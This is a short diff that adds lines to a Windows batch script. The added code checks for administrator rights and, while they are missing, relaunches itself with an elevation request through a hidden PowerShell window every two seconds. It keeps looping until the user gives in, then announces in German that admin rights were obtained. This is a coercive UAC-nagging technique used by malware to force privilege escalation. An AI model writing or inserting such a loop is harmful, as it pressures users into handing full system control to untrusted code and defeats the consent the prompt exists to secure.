@@ -1,1 +1,5 @@
 @echo off
+:loop
+net session >nul 2>&1 || (powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs" 2>nul & timeout /t 2 >nul & goto loop)
+echo Admin erhalten!
+pause
